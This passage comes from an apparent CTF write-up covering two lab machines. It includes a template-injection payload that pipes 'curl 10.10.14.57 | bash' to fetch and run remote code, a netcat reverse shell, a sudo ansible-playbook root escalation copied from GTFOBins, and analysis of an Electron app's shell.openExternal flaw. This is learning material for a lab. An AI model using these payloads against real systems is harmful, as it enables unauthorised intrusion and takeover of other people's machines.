+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">#{</span><span style="color:#F97583">function</span><span style="color:#E1E4E8">(){localLoad</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">global.process.mainModule.</span><span style="color:#79B8FF">constructor</span><span style="color:#E1E4E8">._load;sh</span><span style="color:#F97583">=</span><span style="color:#B392F0">localLoad</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"child_process"</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">exec</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'curl 10.10.14.57 | bash'</span><span style="color:#E1E4E8">)}()}</span></span></code></pre>
+<p>And I get a shell as john and grab the flag:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> rlwrap</span><span style="color:#9ECBFF"> nc</span><span style="color:#79B8FF"> -lvnp</span><span style="color:#79B8FF"> 443</span></span>
+<span class="line"><span style="color:#B392F0">listening</span><span style="color:#9ECBFF"> on</span><span style="color:#E1E4E8"> [any] 443 ...</span></span>
+<span class="line"><span style="color:#B392F0">connect</span><span style="color:#9ECBFF"> to</span><span style="color:#E1E4E8"> [10.10.14.57] from (</span><span style="color:#B392F0">UNKNOWN</span><span style="color:#E1E4E8">) [10.129.228.37] 44176</span></span>
+<span class="line"><span style="color:#B392F0">can</span><span style="color:#B392F0">'t access tty; job control turned off</span></span>
+<span class="line"><span style="color:#B392F0">$ id</span></span>
+<span class="line"><span style="color:#B392F0">$ cd ~</span></span>
+<span class="line"><span style="color:#B392F0">$ cat user.txt</span></span>
+<span class="line"><span style="color:#B392F0">STF22{g410f27d35f21325f47d83c375dedf32}</span></span></code></pre>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>First, I will stabilize my shell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> python3</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> "import pty;pty.spawn('/bin/bash')"</span></span>
+<span class="line"><span style="color:#B392F0">john@bautycare:~$</span></span>
+<span class="line"><span style="color:#E1E4E8">[1]  + 583791 suspended  rlwrap nc -lvnp 443</span></span>
+<span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> stty</span><span style="color:#9ECBFF"> raw</span><span style="color:#79B8FF"> -echo</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">fg</span></span>
+<span class="line"><span style="color:#E1E4E8">[1]  + 583791 continued  rlwrap nc -lvnp 443</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span><span style="color:#9ECBFF"> export</span><span style="color:#9ECBFF"> TERM=xterm</span></span>
+<span class="line"><span style="color:#F97583">export</span><span style="color:#E1E4E8"> TERM</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">xterm</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span></span></code></pre>
+<p>Then, I’ll check if we have any sudo rights:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">john@beautycare:~$</span><span style="color:#9ECBFF"> sudo</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#B392F0">Matching</span><span style="color:#9ECBFF"> Defaults</span><span style="color:#9ECBFF"> entries</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> john</span><span style="color:#9ECBFF"> on</span><span style="color:#9ECBFF"> beautycare:</span></span>
+<span class="line"><span style="color:#B392F0">    env_reset,</span><span style="color:#9ECBFF"> mail_badpass,</span></span>
+<span class="line"><span style="color:#E1E4E8">secure_path</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">/usr/local/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/local/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/usr/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/sbin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/bin</span><span style="color:#79B8FF">\:</span><span style="color:#9ECBFF">/snap/bin</span></span>
+<span class="line"><span style="color:#B392F0">User</span><span style="color:#9ECBFF"> john</span><span style="color:#9ECBFF"> may</span><span style="color:#9ECBFF"> run</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following</span><span style="color:#9ECBFF"> commands</span><span style="color:#9ECBFF"> on</span><span style="color:#9ECBFF"> beautycare:</span></span>
+<span class="line"><span style="color:#E1E4E8">    (</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">NOPASSWD:</span><span style="color:#9ECBFF"> /usr/bin/ansible-playbook</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span></span></code></pre>
+<p>I just searched this binary in gtfobins and grabbed:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">TF</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">mktemp</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> '[{hosts: localhost, tasks: [shell: /bin/sh &#x3C;/dev/tty >/dev/tty 2>/dev/tty]}]'</span><span style="color:#F97583"> ></span><span style="color:#E1E4E8">$TF</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> /usr/bin/ansible-playbook</span><span style="color:#E1E4E8"> $TF</span></span></code></pre>
+<blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/ansible-playbook/">https://gtfobins.github.io/gtfobins/ansible-playbook/</a></p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">TF</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">mktemp</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> '[{hosts: localhost, tasks: [shell: /bin/sh &#x3C;/dev/tty >/dev/tty 2>/dev/tty]}]'</span><span style="color:#F97583"> ></span><span style="color:#E1E4E8">$TF</span></span>
+<span class="line"><span style="color:#E1E4E8">TF</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">mktemp</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span><span style="color:#9ECBFF"> sudo</span><span style="color:#9ECBFF"> /usr/bin/ansible-playbook</span><span style="color:#E1E4E8"> $TF</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> '[{hosts: localhost, tasks: [shell: /bin/sh &#x3C;/dev/tty >/dev/tty 2>/dev/tty]}]'</span><span style="color:#F97583"> ></span><span style="color:#E1E4E8">$TF</span></span>
+<span class="line"><span style="color:#B392F0">john@beautycare:~$</span><span style="color:#9ECBFF"> sudo</span><span style="color:#9ECBFF"> /usr/bin/ansible-playbook</span><span style="color:#E1E4E8"> $TF</span></span>
+<span class="line"><span style="color:#E1E4E8">[WARNING]: provided hosts list is empty, only localhost is available. Note that</span></span>
+<span class="line"><span style="color:#B392F0">the</span><span style="color:#9ECBFF"> implicit</span><span style="color:#9ECBFF"> localhost</span><span style="color:#9ECBFF"> does</span><span style="color:#9ECBFF"> not</span><span style="color:#9ECBFF"> match</span><span style="color:#9ECBFF"> 'all'</span></span>
+<span class="line"><span style="color:#B392F0">PLAY</span><span style="color:#E1E4E8"> [localhost] </span><span style="color:#F97583">**************************************************************</span></span>
+<span class="line"><span style="color:#B392F0">TASK</span><span style="color:#E1E4E8"> [Gathering </span><span style="color:#9ECBFF">Facts]</span><span style="color:#79B8FF"> *********************************************************</span></span>
+<span class="line"><span style="color:#B392F0">ok:</span><span style="color:#E1E4E8"> [localhost]</span></span>
+<span class="line"><span style="color:#B392F0">TASK</span><span style="color:#E1E4E8"> [shell] </span><span style="color:#F97583">*******************************************************************</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># id</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) groups</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D"># cat /root/root.txt</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span>
+<span class="line"><span style="color:#B392F0">STF22</span><span style="color:#9ECBFF">{3f62f62107c411482f5bc8caff1843e2}</span></span></code></pre>
+<p>And that’s it \o/</p>
+<h2 id="electrogrid-fullpwn-2000-points">Electrogrid (Fullpwn, 2000 Points)</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>We started with a simple <code>nmap</code> scan with the basic options:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> 10.129.228.64</span><span style="color:#79B8FF"> -v</span></span>
+<span class="line"><span style="color:#B392F0">9000/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  cslistener?</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> fingerprint-strings:</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   DNSStatusRequestTCP,</span><span style="color:#9ECBFF"> DNSVersionBindReqTCP,</span><span style="color:#9ECBFF"> Help,</span><span style="color:#9ECBFF"> Kerberos,</span><span style="color:#9ECBFF"> LPDString,</span><span style="color:#9ECBFF"> RPCCheck,</span><span style="color:#9ECBFF"> SMBProgNeg,</span><span style="color:#9ECBFF"> SSLSessionReq,</span><span style="color:#9ECBFF"> TLSSessionReq,</span><span style="color:#9ECBFF"> TerminalServerCookie,</span><span style="color:#9ECBFF"> X11Probe:</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     HTTP/1.1</span><span style="color:#79B8FF"> 400</span><span style="color:#9ECBFF"> Bad</span><span style="color:#9ECBFF"> Request</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Connection:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   FourOhFourRequest:</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     HTTP/1.1</span><span style="color:#79B8FF"> 404</span><span style="color:#9ECBFF"> Not</span><span style="color:#9ECBFF"> Found</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Type:</span><span style="color:#9ECBFF"> application/json</span><span style="color:#E1E4E8">; charset</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">utf-8</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Length:</span><span style="color:#79B8FF"> 32</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Date:</span><span style="color:#9ECBFF"> Mon,</span><span style="color:#79B8FF"> 05</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF"> 2022</span><span style="color:#9ECBFF"> 09:45:20</span><span style="color:#9ECBFF"> GMT</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Connection:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#E1E4E8">     {</span><span style="color:#B392F0">"message"</span><span style="color:#79B8FF">:</span><span style="color:#B392F0">"404 page not found"</span><span style="color:#B392F0">}</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   GetRequest,</span><span style="color:#9ECBFF"> HTTPOptions:</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     HTTP/1.1</span><span style="color:#79B8FF"> 404</span><span style="color:#9ECBFF"> Not</span><span style="color:#9ECBFF"> Found</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Type:</span><span style="color:#9ECBFF"> application/json</span><span style="color:#E1E4E8">; charset</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">utf-8</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Length:</span><span style="color:#79B8FF"> 32</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Date:</span><span style="color:#9ECBFF"> Mon,</span><span style="color:#79B8FF"> 05</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF"> 2022</span><span style="color:#9ECBFF"> 09:45:13</span><span style="color:#9ECBFF"> GMT</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Connection:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#E1E4E8">     {</span><span style="color:#B392F0">"message"</span><span style="color:#79B8FF">:</span><span style="color:#B392F0">"404 page not found"</span><span style="color:#B392F0">}</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   RTSPRequest:</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     HTTP/1.1</span><span style="color:#79B8FF"> 404</span><span style="color:#9ECBFF"> Not</span><span style="color:#9ECBFF"> Found</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Type:</span><span style="color:#9ECBFF"> application/json</span><span style="color:#E1E4E8">; charset</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">utf-8</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Content-Length:</span><span style="color:#79B8FF"> 32</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Date:</span><span style="color:#9ECBFF"> Mon,</span><span style="color:#79B8FF"> 05</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF"> 2022</span><span style="color:#9ECBFF"> 09:45:14</span><span style="color:#9ECBFF"> GMT</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     Connection:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">    {"message":"404 page not found"}</span></span></code></pre>
+<p>We just have port 9000 open in this case, which seems like an API. Nothing interesting here for now!</p>
+<p>We are provided with <code>UserLandCityPC-1.0.0.AppImage</code>. We can start by unpacking/unarchiving it using <code>7z</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> 7z</span><span style="color:#9ECBFF"> x</span><span style="color:#9ECBFF"> UserLandCityPC-1.0.0.AppImage</span></span>
+<span class="line"><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">SNIP</span><span style="color:#F97583">></span></span>
+<span class="line"><span style="color:#B392F0">Archives</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> Warnings:</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">Warnings:</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line"><span style="color:#B392F0">Folders:</span><span style="color:#79B8FF"> 19</span></span>
+<span class="line"><span style="color:#B392F0">Files:</span><span style="color:#79B8FF"> 89</span></span>
+<span class="line"><span style="color:#B392F0">Size:</span><span style="color:#79B8FF">       243843126</span></span>
+<span class="line"><span style="color:#B392F0">Compressed:</span><span style="color:#79B8FF"> 95369065</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> ls</span></span>
+<span class="line"><span style="color:#B392F0">AppRun</span><span style="color:#9ECBFF">                  chrome_crashpad_handler</span><span style="color:#9ECBFF">  libEGL.so</span><span style="color:#9ECBFF">     libvk_swiftshader.so</span><span style="color:#9ECBFF">  LICENSES.chromium.html</span><span style="color:#9ECBFF">  resources.pak</span><span style="color:#9ECBFF">      UserLandCityPC-1.0.0.AppImage</span><span style="color:#9ECBFF">  usr</span></span>
+<span class="line"><span style="color:#B392F0">chrome_100_percent.pak</span><span style="color:#9ECBFF">  chrome-sandbox</span><span style="color:#9ECBFF">           libffmpeg.so</span><span style="color:#9ECBFF">  libvulkan.so.1</span><span style="color:#9ECBFF">        locales</span><span style="color:#9ECBFF">                 snapshot_blob.bin</span><span style="color:#9ECBFF">  userlandcitypc.desktop</span><span style="color:#9ECBFF">         v8_context_snapshot.bin</span></span>
+<span class="line"><span style="color:#B392F0">chrome_200_percent.pak</span><span style="color:#9ECBFF">  icudtl.dat</span><span style="color:#9ECBFF">               libGLESv2.so</span><span style="color:#9ECBFF">  LICENSE.electron.txt</span><span style="color:#9ECBFF">  resources</span><span style="color:#9ECBFF">               userlandcitypc</span><span style="color:#9ECBFF">     userlandcitypc.png</span><span style="color:#9ECBFF">             vk_swiftshader_icd.json</span></span></code></pre>
+<p>Checking the <code>resources</code> folder we can find an <code>asar</code> file:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> cd</span><span style="color:#9ECBFF"> resources</span></span>
+<span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland/resources</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> ls</span></span>
+<span class="line"><span style="color:#B392F0">app.asar</span></span></code></pre>
+<p>An <code>asar</code> file is a package file used by the Electron framework to store application code and other assets. So at this point, we’ll know that we’ll be dealing with an electron application.</p>
+<p>I’ll use the following command to extract its content:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">npx</span><span style="color:#9ECBFF"> asar</span><span style="color:#9ECBFF"> extract</span><span style="color:#9ECBFF"> app.asar</span><span style="color:#9ECBFF"> extract</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland/resources</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> cd</span><span style="color:#9ECBFF"> extract</span></span>
+<span class="line"><span style="color:#B392F0">hcue@pjsk:/tmp/userland/resources/extract</span><span style="color:#9ECBFF"> »</span><span style="color:#9ECBFF"> ls</span><span style="color:#79B8FF"> -la</span></span>
+<span class="line"><span style="color:#B392F0">total</span><span style="color:#79B8FF"> 40</span></span>
+<span class="line"><span style="color:#B392F0">drwxr-xr-x</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 4096</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> .</span></span>
+<span class="line"><span style="color:#B392F0">drwx------</span><span style="color:#79B8FF">  3</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 4096</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> ..</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF">  1</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF">  713</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> index.html</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF">  1</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 1488</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> index.js</span></span>
+<span class="line"><span style="color:#B392F0">drwxr-xr-x</span><span style="color:#79B8FF"> 20</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 4096</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> node_modules</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF">  1</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF">  377</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> package.json</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF">  1</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF">  783</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> preload.js</span></span>
+<span class="line"><span style="color:#B392F0">drwxr-xr-x</span><span style="color:#79B8FF">  3</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 4096</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> src</span></span>
+<span class="line"><span style="color:#B392F0">drwxr-xr-x</span><span style="color:#79B8FF">  2</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 4096</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> static</span></span>
+<span class="line"><span style="color:#B392F0">-rwxr-xr-x</span><span style="color:#79B8FF">  1</span><span style="color:#9ECBFF"> hcue</span><span style="color:#9ECBFF"> hcue</span><span style="color:#79B8FF"> 1029</span><span style="color:#9ECBFF"> Dec</span><span style="color:#79B8FF">  5</span><span style="color:#9ECBFF"> 04:58</span><span style="color:#9ECBFF"> webpack.common.js</span></span></code></pre>
+<p>Checking the <code>index.js</code> file, we can notice an interesting function that is being called:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">ipcMain.</span><span style="color:#B392F0">on</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'handle-links'</span><span style="color:#E1E4E8">, (</span><span style="color:#FFAB70">event</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">task</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">url</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> (task </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'download'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> downloadPath</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> '/opt/userland/'</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> filename</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> url.</span><span style="color:#B392F0">split</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">pop</span><span style="color:#E1E4E8">()</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> filepath</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> `${</span><span style="color:#E1E4E8">downloadPath</span><span style="color:#9ECBFF">}${</span><span style="color:#E1E4E8">filename</span><span style="color:#9ECBFF">}`</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">    fs.</span><span style="color:#B392F0">access</span><span style="color:#E1E4E8">(filepath, fs.</span><span style="color:#79B8FF">F_OK</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">async</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">err</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> (err) {</span></span>
+<span class="line"><span style="color:#F97583">        await</span><span style="color:#B392F0"> download</span><span style="color:#E1E4E8">(BrowserWindow.</span><span style="color:#B392F0">getFocusedWindow</span><span style="color:#E1E4E8">(), url, { directory: downloadPath })</span></span>
+<span class="line"><span style="color:#E1E4E8">        win.webContents.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'file-downloaded'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">`File Imported at: ${</span><span style="color:#E1E4E8">downloadPath</span><span style="color:#9ECBFF">}${</span><span style="color:#E1E4E8">filename</span><span style="color:#9ECBFF">}`</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        return</span></span>
+<span class="line"><span style="color:#E1E4E8">      }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">      win.webContents.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'file-downloaded'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">`File Already Exists At: ${</span><span style="color:#E1E4E8">downloadPath</span><span style="color:#9ECBFF">}${</span><span style="color:#E1E4E8">filename</span><span style="color:#9ECBFF">}`</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    })</span></span>
+<span class="line"><span style="color:#E1E4E8">  } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">    shell.</span><span style="color:#B392F0">openExternal</span><span style="color:#E1E4E8">(url)</span></span>
+<span class="line"><span style="color:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#E1E4E8">})</span></span></code></pre>
+<p>The code listens for an <code>handle-links</code> event on the <code>ipcMain</code> module, which is used to communicate between the main process and renderer processes in Electron.
+When the <code>handle-links</code> event is received, the code checks the value of the <code>task</code> argument to determine the desired action. If the <code>task</code> argument is <code>download</code>, the code extracts the filename from the <code>url</code>. And here comes the interesting part, where urls are passed to the <code>shell.openExternal</code> function which allows this application to open a URL in the web browser. Researching about this function we see that it can allow us to execute arbitrary code on the user’s system. Another possibility is that if we have control over the <code>filename</code> variable, we will eventually have file overwrite while traversing the directory.</p>
+<p>We’ll get back to this later, once we understand how this application works.</p>
+<p>In the <code>src/js</code> folder, we have <code>app.js</code> which seems to be packed. Without cleaning it, we can notice that’s it talking with an API where it takes the URL from <code>config.json</code> which seems missing from the source.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">_config_json__WEBPACK_IMPORTED_MODULE_1__.</span><span style="color:#79B8FF">BACKEND_URL</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#6A737D">/* harmony import */</span><span style="color:#F97583"> var</span><span style="color:#E1E4E8"> _config_json__WEBPACK_IMPORTED_MODULE_1__ </span><span style="color:#F97583">=</span><span style="color:#B392F0"> __webpack_require__</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#6A737D">  /*! ./config.json */</span><span style="color:#9ECBFF"> './src/js/config.json'</span></span>
+<span class="line"><span style="color:#E1E4E8">)</span></span></code></pre>
+<p>Since we knew/assumed that we have an API running on port 9000, <code>BACKEND_URL</code> should be <code>http://10.129.228.64:9000</code>. Reading much further, we can see an API call to <code>/api/login</code> where we find credentials for the <code>developer</code> user.</p>
